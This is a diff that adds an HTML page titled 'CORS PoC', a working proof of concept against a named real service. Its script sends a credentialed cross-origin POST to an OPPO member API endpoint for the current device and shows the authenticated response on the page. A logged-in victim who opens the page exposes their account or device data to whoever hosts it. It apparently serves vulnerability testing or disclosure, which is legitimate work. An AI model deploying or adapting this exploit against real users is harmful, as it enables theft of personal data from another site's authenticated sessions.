@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<body>
+<h1>CORS PoC</h1>
+
+<pre id="out"></pre>
+
+<script>
+fetch("https://memberapi-in.oppo.com/membercore/device/current", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+        "Content-Type": "application/json;charset=UTF-8"
+    },
+    body: JSON.stringify({
+        countryCode: "IN",
+        storeViewCode: "in"
+    })
+})
+.then(async r => {
+    const text = await r.text();
+
+    document.getElementById("out").innerText =
+        "STATUS: " + r.status + "\\n\\n" + text;
+
+    console.log(text);
+})
+.catch(e => {
+    document.getElementById("out").innerText = e;
+});
+</script>
+
+</body>
+</html>
